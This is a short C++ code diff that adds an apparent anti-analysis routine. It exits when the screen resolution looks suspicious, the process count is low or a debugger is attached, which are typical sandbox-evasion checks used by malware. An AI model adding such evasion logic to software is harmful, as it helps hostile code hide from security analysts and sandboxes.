@@ -72,3 +72,18 @@ bool AntiAnalysis::checkDebugger() {
 
     return false;
 }
+bool AntiAnalysis::runAntiAnalysis() {
+    if (!checkScreenResolution()) {
+        return false;  // Suspicious resolution, exit
+    }
+
+    if (!checkProcessCount()) {
+        return false;  // Too few processes, exit
+    }
+
+    if (checkDebugger()) {
+        return false;  // Debugger detected, exit
+    }
+
+    return true;  // Passed all checks
+}
